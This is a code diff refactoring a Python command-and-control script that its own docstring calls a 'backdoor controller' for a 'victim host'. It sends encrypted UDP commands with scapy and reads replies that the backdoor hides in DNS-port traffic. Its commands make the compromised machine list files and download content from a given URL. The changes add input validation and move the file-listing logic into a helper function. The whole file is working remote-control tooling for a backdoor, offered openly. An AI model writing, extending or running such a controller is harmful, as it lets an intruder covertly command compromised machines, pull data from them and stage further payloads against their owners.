@@ -1,12 +1,25 @@
+"""
+    This is the backdoor controller program.
+    It allows you to control the backdoor on a victim host
+    by sending it different commands over a network.
+"""
 
-from utils.shell import *
-from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
-from utils.encryption import *
-from multiprocessing import Process, SimpleQueue
+
+# Standard Library Modules
 import argparse
+from multiprocessing import Process, SimpleQueue
 from ipaddress import ip_address, IPv6Address
 from sys import exit
 from time import sleep
+
+# Custom Modules
+from utils.shell import *
+from utils.encryption import *
+from utils.validation import validate_ipv4_address, validate_nic_interface
+
+# Third Party Libraries
+from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
+
 
 # Command Line Arguments
 parser = argparse.ArgumentParser("./main.py")
@@ -15,19 +28,34 @@ parser.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host."
 parser.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 args = parser.parse_args()
 
-# Validate Arguments
 
+# Validate Arguments
+if not validate_ipv4_address(args.controller_ip):
+    print(f"Invalid IPv4 Address: '{args.controller_ip}'")
+    exit(1)
+
+if not validate_ipv4_address(args.backdoor_ip):
+    print(f"Invalid IPv4 Address: '{args.backdoor_ip}'")
+    exit(1)
+    
+if not validate_nic_interface(args.interface):
+    print(f"Network Interface does not exist: '{args.interface}'")
+    exit(1)
+
+
+# Global Variables
 CONTROLLER_IP = args.controller_ip
 BACKDOOR_IP = args.backdoor_ip
 NETWORK_INTERFACE = args.interface
-
 queue = SimpleQueue()
+encryption_handler = StreamEncryption()
+
 
 # Initialize the encryption context.
-encryption_handler = StreamEncryption()
 encryption_handler.read_nonce("data/nonce.bin")
 encryption_handler.read_secret("data/secret.key")
 encryption_handler.initialize_encryption_context()
+
 
 def subprocess_packet_handler(pkt):
     if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
@@ -45,8 +73,10 @@ def subprocess_packet_handler(pkt):
     response[IP].dst = f"{BACKDOOR_IP}"
     send(response, verbose=0)
 
+
 def subprocess_start():
     sniff(filter=f"ip src host {BACKDOOR_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)
+
 
 def send_udp(data: str):
     """
@@ -65,6 +95,7 @@ def send_udp(data: str):
     # Send the packet.
     send(pkt, verbose=0)
 
+
 def handle_wget(data):
     # 1. Send command
     send_udp(data)
@@ -79,6 +110,21 @@ def handle_wget(data):
     decrypted = encryption_handler.decrypt(encrypted)
     print(f"Response: {decrypted.decode('utf-8')}")
 
+
+def handle_list(data):
+    # Send the command to backdoor.
+    send_udp(data)
+    # Receive the response.
+    encrypted = None
+    while True:
+        if queue.empty():
+            continue
+        encrypted = queue.get()
+        break
+    decrypted = encryption_handler.decrypt(encrypted)
+    print(f"Response: {decrypted.decode('utf-8')}")
+
+
 if __name__ == "__main__":
 
     # Start the secondary process which sniffs for DNS requests from the backdoor,
@@ -87,16 +133,16 @@ if __name__ == "__main__":
     decode_process = Process(target=subprocess_start)
     decode_process.start()
 
-    # Main shell loop
+    # Interactive Shell
     print_menu()
     while True:
         try:
             command = input("λ: ")
         except KeyboardInterrupt:
             break
-        args = command.split(" ")
-        arg_count = len(args)
-        if arg_count == 1:
+        argv = command.split(" ")
+        argc = len(argv)
+        if argc == 1:
             if command == HELP:
                 print_help()
                 continue
@@ -105,29 +151,20 @@ if __name__ == "__main__":
                 continue
             elif command == EXIT:
                 break
-        if arg_count == 2:
-            if args[0] == LIST:
-                file_path = args[1]
-                data = args[0] + " " + args[1]
-                # Send the command to backdoor.
-                send_udp(data)
-                # Receive the response.
-                encrypted = None
-                while True:
-                    if queue.empty():
-                        continue
-                    encrypted = queue.get()
-                    break
-                decrypted = encryption_handler.decrypt(encrypted)
-                print(f"Response: {decrypted.decode('utf-8')}")
+        if argc == 2:
+            if argv[0] == LIST:
+                file_path = argv[1]
+                data = argv[0] + " " + argv[1]
+                handle_list(data)
                 continue
-        if arg_count == 3:
-            if args[0] == WGET:
-                url = args[1]
-                filepath = args[2]
-                data = args[0] + " " + args[1] + " " + args[2]
+        if argc == 3:
+            if argv[0] == WGET:
+                url = argv[1]
+                filepath = argv[2]
+                data = argv[0] + " " + argv[1] + " " + argv[2]
                 handle_wget(data)
                 continue
         else:
             print(f"Command not found: {command}")
     decode_process.kill()
+
